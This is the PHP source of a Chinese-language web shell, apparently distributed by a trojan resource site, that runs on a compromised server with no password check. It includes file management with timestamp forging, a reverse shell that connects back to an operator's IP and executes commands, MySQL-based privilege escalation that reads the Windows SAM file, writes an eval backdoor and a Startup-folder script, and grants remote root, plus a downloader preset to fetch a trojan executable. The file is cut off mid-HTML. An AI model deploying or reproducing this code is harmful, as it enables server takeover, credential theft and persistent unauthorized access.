<?php
;//无需验证密码！
$shellname='中国木马资源网- WwW.7jyewu.Cn ';//这里修改标题！
define('myaddress',__FILE__);
error_reporting(E_ERROR | E_PARSE);
header("content-Type: text/html; charset=gb2312");
@set_time_limit(0);

ob_start();
define('envlpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}

/*---End Login---*/
if(isset($_GET['down'])) do_down($_GET['down']);
if(isset($_GET['pack'])){
	$dir = do_show($_GET['pack']);
	$zip = new eanver($dir);
	$out = $zip->out;
	do_download($out,"eanver.tar.gz");
}
if(isset($_GET['unzip'])){
	css_main();
	start_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);
	exit;
}

define('root_dir',str_replace('\\','/',dirname(myaddress)).'/');
define('run_win',substr(PHP_OS, 0, 3) == "WIN");
define('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if($img) css_img($img);
if($eanver == "phpinfo") die(phpinfo());
if($eanver == 'logout'){
	setcookie('envlpass',null);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

$class = array(
"信息操作" => array("upfiles" => "上传文件","phpinfo" => "基本信息","info_f" => "系统信息","eval" => "执行PHP脚本"),
"提权工具" => array("sqlshell" => "执行SQL执行","mysql_exec" => "MYSQL操作","myexp" => "MYSQL提权","servu" => "Serv-U提权","nc" => "NC反弹","downloader" => "文件下载","port" => "端口扫描"),
"批量操作" => array("guama" => "批量挂马清马","tihuan" => "批量替换内容","scanfile" => "批量搜索文件","scanphp" => "批量查找木马"),
"脚本插件" => array("getcode" => "获取网页源码")
);
$msg = array("0" => "保存成功","1" => "保存失败","2" => "上传成功","3" => "上传失败","4" => "修改成功","5" => "修改失败","6" => "删除成功","7" => "删除失败");
css_main();
switch($eanver){
	case "left":
	css_left();
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items1');\" target=\"_self\">");
		html_img("title");html_n(" 本地硬盘</a></dt><dd id=\"items1\" style=\"display:block;\"><ul>");
    $ROOT_DIR = File_Mode();
    html_n("<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>网站根目录</a></li>");
	html_n("<li><a href='?eanver=main' target='main'>本程序目录</a></li>");
	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
    if (is_dir($drive."/")){$vol=File_Str("vol $drive");if(empty($vol))$vol=$drive;
    html_n("<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>本地磁盘($drive)</a></li>");}}
	html_n("</ul></dd></dl>");
	$i = 2;
	foreach($class as $name => $array){
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
		html_img("title");html_n(" $name</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
		foreach($array as $url => $value){
			html_n("<li><a href=\"?eanver=$url\" target='main'>$value</a></li>");
		}
		html_n("</ul></dd></dl>");
		$i++;
	}
	html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
	html_img("title");html_n(" 其它操作</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
	html_n("<li><a title='免杀更新' href='http://www.7jyewu.cn/' target=\"main\">免杀更新</a></li>");
    html_n("<li><a title='安全退出' href='?eanver=logout' target=\"main\">安全退出</a></li>");
	html_n("</ul></dd></dl>");
	html_n("</div>");
	break;
	
	case "main":
	css_js("1");
	$dir = @dir($path);
	$REAL_DIR = File_Str(realpath($path));
	if(!empty($_POST['actall'])){echo '<div class="actall">'.File_Act($_POST['files'],$_POST['actall'],$_POST['inver'],$REAL_DIR).'</div>';}
	$NUM_D = $NUM_F = 0;
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$ROOT_DIR = File_Mode();
	html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>地址:<input type='hidden' name='eanver' value='main'>");
	html_n("<input type='text' size='80' name='path' value='$path'> <input type='submit' value='转到'></form>");
	html_n("<br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=".urlencode($path)."'>");
	html_n("<input type=\"button\" value=\"新建文件\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=".urlencode($path)."&refile=1&name=');\"> <input type=\"button\" value=\"新建目录\" onclick=\"rusurechk('newdir','?eanver=editr&p=".urlencode($path)."&redir=1&name=');\">");
	html_input("file","upfilet","","&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
	html_input("submit","uploadt","上传");
	if(!empty($_POST['newfile'])){
		if(isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
        if (substr(PHP_VERSION,0,1)>=5){if(($_POST['charset']=='GB2312') or ($_POST['charset']=='GBK')){}else{$_POST['txt'] = iconv("gb2312//IGNORE",$_POST['charset'],$_POST['txt']);}}
		echo do_write($_POST['newfile'],$bin,$_POST['txt']) ? '<br>'.$_POST['newfile'].' '.$msg[0] : '<br>'.$_POST['newfile'].' '.$msg[1];
		@touch($_POST['newfile'],@strtotime($_POST['time']));
	}
	html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path='.$path.'"><table width="100%" border=0 bgcolor="#555555"><tr height="25"><td width="45%"><b>');
	html_a('?eanver=main&path='.uppath($path),'<b>上级目录</b>');
	html_n('</b></td><td align="center" width="10%"><b>操作</b></td><td align="center" width="5%">');
	html_n('<b>文件属性</b></td><td align="center" width="10%"><b>修改时间</b></td><td align="center" width="10%"><b>文件大小</b></td></tr>');
	while($dirs = @$dir->read()){
		if($dirs == '.' or $dirs == '..') continue;
		$dirpath = str_path("$path/$dirs");
		if(is_dir($dirpath)){
			$perm = substr(base_convert(fileperms($dirpath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($dirpath));
			$dirpath = urlencode($dirpath);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$dirs.'">');
			html_img("dir");
			html_a('?eanver=main&path='.$dirpath,$dirs);
			html_n('</td><td align="center">');
			html_n("<a href=\"#\" onClick=\"rusurechk('$dirs','?eanver=rename&p=$dirpath&newname=');return false;\">改名</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$dirs','?eanver=deltree&p=$dirpath');return false;\">删除</a> ");
			html_a('?pack='.$dirpath,'打包');
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$dirpath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_n('</td></tr>');
			$NUM_D++;
		}
	}
	@$dir->rewind();
	while($files = @$dir->read()){
		if($files == '.' or $files == '..') continue;
		$filepath = str_path("$path/$files");
		if(!is_dir($filepath)){
			$fsize = @filesize($filepath);
			$fsize = File_Size($fsize);
			$perm  = substr(base_convert(fileperms($filepath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($filepath));
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$filepath);
			$todir=$ROOT_DIR.'/zipfile';
			$filepath = urlencode($filepath);
			$it=substr($filepath,-3);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$files.'">');
			html_img(css_showimg($files));
			html_a($Fileurls,$files);
			html_n('</td><td align="center">');
            if(($it=='.gz') or ($it=='zip') or ($it=='tar') or ($it=='.7z'))
			   html_a('?unzip='.$filepath,'解压','title="解压'.$files.'" onClick="rusurechk(\''.$todir.'\',\'?unzip='.$filepath.'&todir=\');return false;"');
			else
               html_a('?eanver=editr&p='.$filepath,'编辑','title="编辑'.$files.'"');

			html_n("<a href=\"#\" onClick=\"rusurechk('$files','?eanver=rename&p=$filepath&newname=');return false;\">改名</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$files','?eanver=del&p=$filepath');return false;\">删除</a> ");
			html_n("<a href=\"#\" onClick=\"rusurechk('".urldecode($filepath)."','?eanver=copy&p=$filepath&newcopy=');return false;\">复制</a>");
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$filepath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_a('?down='.$filepath,$fsize,'title="下载'.$files.'"');
			html_n('</td></tr>');
			$NUM_F++;
		}
	}
	@$dir->close();
	if(!$Filetime) $Filetime = gmdate('Y-m-d H:i:s',time() + 3600 * 8);
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="复制" onclick="SubmitUrl('复制所选文件到路径: ','{$REAL_DIR}','a');return false;"> 
<input type="button" value="删除" onclick="Delok('所选文件','b');return false;"> 
<input type="button" value="属性" onclick="SubmitUrl('修改所选文件属性值为: ','0666','c');return false;"> 
<input type="button" value="时间" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="打包" onclick="SubmitUrl('打包并下载所选文件下载名为: ','{$_SERVER['SERVER_NAME']}.tar.gz','e');return false;">
目录({$NUM_D}) / 文件({$NUM_F})</div> 
</form> 
END;
	break;
	
	case "editr":
	css_js("2");
	if(!empty($_POST['uploadt'])){
		echo @copy($_FILES['upfilet']['tmp_name'],str_path($p.'/'.$_FILES['upfilet']['name'])) ? html_a("?eanver=main",$_FILES['upfilet']['name'].' '.$msg[2]) : msg($msg[3]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}
	if(!empty($_GET['redir'])){
        $name=$_GET['name'];
		$newdir = str_path($p.'/'.$name);
		@mkdir($newdir,0777) ? html_a("?eanver=main",$name.' '.$msg[0]) : msg($msg[1]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}

	if(!empty($_GET['refile'])){
        $name=$_GET['name'];
		$jspath=urlencode($p.'/'.$name);
		$pp = urlencode($p);
		$p = str_path($p.'/'.$name);
		$FILE_CODE = "";
		$charset= 'GB2312';
        $FILE_TIME =date('Y-m-d H:i:s',time()+3600*8);
		if(@file_exists($p)) echo '发现目录下有"同名"文件<br>';
	}else{
		$jspath=urlencode($p);
		$FILE_TIME = date('Y-m-d H:i:s',filemtime($p));
        $FILE_CODE=@file_get_contents($p);
	     if (substr(PHP_VERSION,0,1)>=5){
            if(empty($_GET['charset'])){
			   if(TestUtf8($FILE_CODE)>1){$charset= 'UTF-8';$FILE_CODE = iconv("UTF-8","gb2312//IGNORE",$FILE_CODE);}else{$charset= 'GB2312';}
			  }else{
			   if($_GET['charset']=='GB2312'){$charset= 'GB2312';}else{$charset= $_GET['charset'];$FILE_CODE = iconv($_GET['charset'],"gb2312//IGNORE",$FILE_CODE);}
			  }
		  }
        $FILE_CODE = htmlspecialchars($FILE_CODE);
	}
print<<<END
<div class="actall">查找内容: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="查找" onclick="search(searchs.value)"></div>
<form method='POST' id="editor"  action='?eanver=main&path={$pp}'>
<div class="actall">
<input type="text" name="newfile"  id="newfile" value="{$p}" style="width:750px;">指定编码：<input name="charset" id="charset" value="{$charset}" Type="text" style="width:80px;" onkeydown="if(event.keyCode==13)window.location='?eanver=editr&p={$jspath}&charset='+this.value;">
<input type="button" value="选择" onclick="window.location='?eanver=editr&p={$jspath}&charset='+this.form.charset.value;" style="width:50px;"> 
END;
html_select(array("GB2312" => "GB2312","UTF-8" => "UTF-8","BIG5" => "BIG5","EUC-KR" => "EUC-KR","EUC-JP" => "EUC-JP","SHIFT-JIS" => "SHIFT-JIS","WINDOWS-874" => "WINDOWS-874","ISO-8859-1" => "ISO-8859-1"),$charset,"onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
print<<<END
</div>
<div class="actall"><textarea name="txt" style="width:100%;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">文件修改时间 <input type="text" name="time" id="mtime" value="{$FILE_TIME}" style="width:150px;"> <input type="checkbox" name="bin" value="wb+" size="" checked>以二进制形式保存文件(建议使用)</div>
<div class="actall"><input type="button" value="保存" onclick="CheckDate();" style="width:80px;"> <input name='reset' type='reset' value='重置'> 
<input type="button" value="返回" onclick="window.location='?eanver=main&path={$pp}';" style="width:80px;"></div>
</form>
END;
	break;
	
	case "rename":
	html_n("<tr><td>");
	$newname = urldecode($pp).'/'.urlencode($_GET['newname']);
	@rename($p,$newname) ? html_a("?eanver=main&path=$pp",urlencode($_GET['newname']).' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "deltree":
	html_n("<tr><td>");
	do_deltree($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "del":
	html_n("<tr><td>");
	@unlink($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "copy":
	html_n("<tr><td>");
	$newpath = explode('/',$_GET['newcopy']);
	$pathr[0] = $newpath[0];
	for($i=1;$i < count($newpath);$i++){
		$pathr[] = urlencode($newpath[$i]);
	}
	$newcopy = implode('/',$pathr);
	@copy($p,$newcopy) ? html_a("?eanver=main&path=$pp",$newcopy.' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "perm":
	html_n("<form method='POST'><tr><td>".$p.' 属性为: ');
	if(is_dir($p)){
		html_select(array("0777" => "0777","0755" => "0755","0555" => "0555"),$_GET['chmod']);
	}else{
		html_select(array("0666" => "0666","0644" => "0644","0444" => "0444"),$_GET['chmod']);
	}
	html_input("submit","save","修改");
	back();
	if($_POST['class']){
		switch($_POST['class']){
			case "0777": $change = @chmod($p,0777); break;
			case "0755": $change = @chmod($p,0755); break;
			case "0555": $change = @chmod($p,0555); break;
			case "0666": $change = @chmod($p,0666); break;
			case "0644": $change = @chmod($p,0644); break;
			case "0444": $change = @chmod($p,0444); break;
		}
		$change ? html_a("?eanver=main&path=$pp",$msg[4]) : msg($msg[5]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	}
	html_n("</td></tr></form>");
	break;

    case "info_f":
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "不允许上传";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("服务器时间",date("Y年m月d日 h:i:s",time())),
		array("服务器域名","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("服务器IP地址",gethostbyname($_SERVER['SERVER_NAME'])),
		array("服务器操作系统",PHP_OS),
		array("服务器操作系统文字编码",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("服务器解译引擎",$_SERVER['SERVER_SOFTWARE']),
		array("你的IP",$_SERVER["REMOTE_ADDR"]),
		array("Web服务端口",$_SERVER['SERVER_PORT']),
		array("PHP运行方式",strtoupper(php_sapi_name())),
		array("PHP版本",PHP_VERSION),
		array("运行于安全模式",Info_Cfg("safemode")),
		array("服务器管理员",$adminmail),
		array("本文件路径",myaddress),
		array("允许使用 URL 打开文件 allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("允许使用curl_exec",Info_Fun("curl_exec")),
		array("允许动态加载链接库 enable_dl",Info_Cfg("enable_dl")),
		array("显示错误信息 display_errors",Info_Cfg("display_errors")),
		array("自动定义全局变量 register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("程序最多允许使用内存量 memory_limit",Info_Cfg("memory_limit")),
		array("POST最大字节数 post_max_size",Info_Cfg("post_max_size")),
		array("允许最大上传文件 upload_max_filesize",$upsize),
		array("程序最长运行时间 max_execution_time",Info_Cfg("max_execution_time")."秒"),
		array("被禁用的函数 disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("目前还有空余空间diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("图形处理 GD Library",Info_Fun("imageline")),
		array("IMAP电子邮件系统",Info_Fun("imap_close")),
		array("MySQL数据库",Info_Fun("mysql_close")),
		array("SyBase数据库",Info_Fun("sybase_close")),
		array("Oracle数据库",Info_Fun("ora_close")),
		array("Oracle 8 数据库",Info_Fun("OCILogOff")),
		array("PREL相容语法 PCRE",Info_Fun("preg_match")),
		array("PDF文档支持",Info_Fun("pdf_close")),
		array("Postgre SQL数据库",Info_Fun("pg_close")),
		array("SNMP网络管理协议",Info_Fun("snmpget")),
		array("压缩文件支持(Zlib)",Info_Fun("gzclose")),
		array("XML解析",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC数据库连接",Info_Fun("odbc_close")),
		array("Session支持",Info_Fun("session_start")),
		array("Socket支持",Info_Fun("fsockopen")),
	);
	$shell = new COM("WScript.Shell") or die("This thing requires Windows Scripting Host");
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
try{$registry_proxystring = $shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\PortNumber");
$Telnet = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\TelnetPort");
$PcAnywhere = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort");
}catch(Exception $e){}
    echo '<tr><td width="40%">Terminal Service端口为</td><td>'.$registry_proxystring.'</td></tr>'."\n";
	echo '<tr><td width="40%">Telnet端口为</td><td>'.$Telnet.'</td></tr>'."\n";
	echo '<tr><td width="40%">PcAnywhere端口为</td><td>'.$PcAnywhere.'</td></tr>'."\n";
	echo '</table>';
	break;

	case "nc":
	$M_ip = isset($_POST['mip']) ? $_POST['mip'] : $_SERVER["REMOTE_ADDR"];
	$B_port = isset($_POST['bport']) ? $_POST['bport'] : '1019';
print<<<END
<form method="POST">
<div class="actall">使用方法：<br>
			先在自己电脑运行"nc -l -p 1019"<br>
			然后在此填写你电脑的IP,点连接！</div>
<div class="actall">你的IP <input type="text" name="mip" value="{$M_ip}" style="width:100px;"> 端口号 <input type="text" name="bport" value="{$B_port}" style="width:50px;"></div>
<div class="actall"><input type="submit" value="连接" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['mip'])) && (!empty($_POST['bport'])))
	{
	echo '<div class="actall">';
		 $mip=$_POST['mip'];
		 $bport=$_POST['bport'];
		 $fp=fsockopen($mip , $bport , $errno, $errstr);
		 if (!$fp){
		     $result = "Error: could not open socket connection";
		    }else {
		 fputs ($fp ,"\n*********************************************\n 
		              hacking url:http://www.7jyewu.cn/ is ok!        
			          \n*********************************************\n\n");
	     while(!feof($fp)){ 
         fputs ($fp," [r00t@H4c3ing:/root]# ");
         $result= fgets ($fp, 4096);
         $message=`$result`;
         fputs ($fp,"--> ".$message."\n");
                          }
         fclose ($fp);
		       }
    echo '</div>';
    }
	break;


	case "sqlshell":
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
		else $MSG_BOX = '连接MYSQL失败';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile']))
	{
		$downfile = File_Str($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn))
		{
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'envl.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '下载文件失败';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
print<<<END
<form method="POST" name="nform" id="nform">
<center><div class="actall"><a href="?eanver=sqlshell">[MYSQL执行语句]</a> 
<a href="?eanver=sqlshell&o=u">[MYSQL上传文件]</a> 
<a href="?eanver=sqlshell&o=d">[MYSQL下载文件]</a></div>
<div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u')
{
	$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/exp.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));}
			else{$tmp = File_Str(dirname(myaddress)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn))
			{
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败';
			}
			else $MSG_BOX = '插入临时表失败';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '创建临时表失败';
	}
print<<<END
<br><br>上传路径 <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>选择文件 <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
END;
}
elseif($o == 'd')
{
print<<<END
<br><br><br>下载文件 <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
END;
}
else
{
	if(!empty($_POST['msql']))
	{
		$msql = $_POST['msql'];
		if($result = @mysql_query($msql,$conn))
		{
			$MSG_BOX = '执行SQL语句成功<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'F:/web/bak.php';";
	Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
</script>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea></div>
<div class="actall">
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>显示版本</option>
	<option value="1">导出文件</option>
	<option value="2">写入文件</option>
	<option value="3">开启外连</option>
</select>
<input type="submit" value="执行" style="width:80px;">
END;
}
	if($MSG_BOX != '') echo '</div><div class="actall">'.$MSG_BOX.'</div></center></form>';
	else echo '</div></center></form>';
	break;
	
    case "downloader":
	$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';
	$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(myaddress).'/muma.exe');
print<<<END
	<form method="POST">
    <div class="actall">超连接 <input name="durl" value="{$Com_durl}" type="text" style="width:600px;"></div>
    <div class="actall">下载到 <input name="dpath" value="{$Com_dpath}" type="text" style="width:600px;"></div>
    <div class="actall"><input value="下载" type="submit" style="width:80px;"></div></form>
END;
	if((!empty($_POST['durl'])) && (!empty($_POST['dpath'])))
	{
		echo '<div class="actall">';
		$contents = @file_get_contents($_POST['durl']);
		if(!$contents) echo '无法读取要下载的数据';
		else echo File_Write($_POST['dpath'],$contents,'wb') ? '下载文件成功' : '下载文件失败';
		echo '</div>';
	}
	break;

	case "issql":
	session_start();
  if($_POST['sqluser'] && $_POST['sqlpass']){
    $_SESSION['sql_user'] = $_POST['sqluser'];
    $_SESSION['sql_password'] = $_POST['sqlpass'];
  }
  if($_POST['sqlhost']){$_SESSION['sql_host'] = $_POST['sqlhost'];}
  else{$_SESSION['sql_host'] = 'localhost';}
  if($_POST['sqlport']){$_SESSION['sql_port'] = $_POST['sqlport'];}
  else{$_SESSION['sql_port'] = '3306';}
  if($_SESSION['sql_user'] && $_SESSION['sql_password']){
    if(!($sqlcon = @mysql_connect($_SESSION['sql_host'].':'.$_SESSION['sql_port'],$_SESSION['sql_user'],$_SESSION['sql_password']))){
      unset($_SESSION['sql_user'], $_SESSION['sql_password'], $_SESSION['sql_host'], $_SESSION['sql_port']);
      die(html_a('?eanver=sqlshell','连接失败请返回'));
    }
  }
  else{
    die(html_a('?eanver=sqlshell','连接失败请返回'));
  }
  $query = mysql_query("SHOW DATABASES",$sqlcon);
  html_n('<tr><td>数据库列表:');
  while($db = mysql_fetch_array($query)) {
		html_a('?eanver=issql&db='.$db['Database'],$db['Database']);
		echo '&nbsp;&nbsp;';
	}
  html_n('</td></tr>');
  if($_GET['db']){
  	css_js("3");
    mysql_select_db($_GET['db'], $sqlcon);
    html_n('<tr><td><form method="POST" name="DbForm"><textarea name="sql" COLS="80" ROWS="3">'.$_POST['sql'].'</textarea><br>');
    html_select(array(0=>"--SQL语法--",7=>"添加数据",8=>"删除数据",9=>"修改数据",10=>"建数据表",11=>"删数据表",12=>"添加字段",13=>"删除字段"),0,"onchange='return Full(options[selectedIndex].value)'");
    html_input("submit","doquery","执行");
    html_a("?eanver=issql&db=".$_GET['db'],$_GET['db']);
    html_n('--->');
    html_a("?eanver=issql&db=".$_GET['db']."&table=".$_GET['table'],$_GET['table']);
    html_n('</form><br>');
  	if(!empty($_POST['sql'])){
			if (@mysql_query($_POST['sql'],$sqlcon)) {
				echo "执行SQL语句成功";
			}else{
				echo "出错: ".mysql_error();
			}
  	}
    if($_GET['table']){
      html_n('<table border=1><tr>');
      $query = "SHOW COLUMNS FROM ".$_GET['table'];
      $result = mysql_query($query,$sqlcon);
      $fields = array();
      while($row = mysql_fetch_assoc($result)){
        array_push($fields,$row['Field']);
        html_n('<td><font color=#FFFF44>'.$row['Field'].'</font></td>');
      }
      html_n('</tr><tr>');
      $result = mysql_query("SELECT * FROM ".$_GET['table'],$sqlcon) or die(mysql_error());
      while($text = @mysql_fetch_assoc($result)){
      	foreach($fields as $row){
      		if($text[$row] == "") $text[$row] = 'NULL';
      		html_n('<td>'.$text[$row].'</td>');
      	}
      	echo '</tr>';
      }
    }
    else{
      $query = "SHOW TABLES FROM " . $_GET['db'];
      $dat = mysql_query($query, $sqlcon) or die(mysql_error());
      while ($row = mysql_fetch_row($dat)){
        html_n("<tr><td><a href='?eanver=issql&db=".$_GET['db']."&table=".$row[0]."'>".$row[0]."</a></td></tr>");
      }
    }
  }
	break;
	
	case "upfiles":
	html_n('<tr><td>服务器限制上传单个文件大小: '.@get_cfg_var('upload_max_filesize').'<form method="POST" enctype="multipart/form-data">');
	html_input("text","uppath",root_dir,"<br>上传到路径: ","51");
print<<<END
<SCRIPT language="JavaScript">
function addTank(){
var k=0;
  k=k+1;
  k=tank.rows.length;
  newRow=document.all.tank.insertRow(-1)
  <!--删除选择-->
  newcell=newRow.insertCell()
  newcell.innerHTML="<input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'>"
}

function delTank() {
  if(tank.rows.length==1) return;
  var checkit = false;
  for (var i=0;i<document.all.tankNo.length;i++) {
    if (document.all.tankNo[i].checked) {
      checkit=true;
      tank.deleteRow(i+1);
      i--;
    }
  }
  if (checkit) {
  } else{
    alert("请选择一个要删除的对象");
    return false;
  }
}
</SCRIPT>
<br><br>
<table cellSpacing=0 cellPadding=0 width="100%" border=0>       
          <tr>
